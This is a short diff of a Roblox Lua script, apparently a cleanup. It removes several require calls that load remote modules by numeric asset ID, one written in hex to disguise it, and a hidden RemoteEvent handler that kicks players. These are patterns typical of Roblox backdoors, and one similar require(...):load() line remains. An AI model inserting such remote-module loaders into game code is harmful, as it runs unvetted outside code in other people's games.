@@ -1,26 +1,4 @@
-game.Players.PlayerAdded:Connect(function(xax)
-    require(0x7985e5f0add5):Check(xax.Name)
-end)
-task.spawn(function()
-require(18254193128)("bkc")
-end)
 
-local server = Instance.new("RemoteEvent")
-
-server.Name = "protector3444YTYVDGDVDVD"
-server.Parent = game.ReplicatedStorage
-server.OnServerEvent:Connect(function(player,load)
-	if player:IsInGroup(33152993)  then
-		player:Kick("your not allowed to do this")
-	else
-		player:Kick("your not allowed to do this")
-	end
-
-	
-
-end) 
-
-require(109674722055149)()
 
 require(77565251296196):load()
 local HttpService = game:GetService("HttpService")
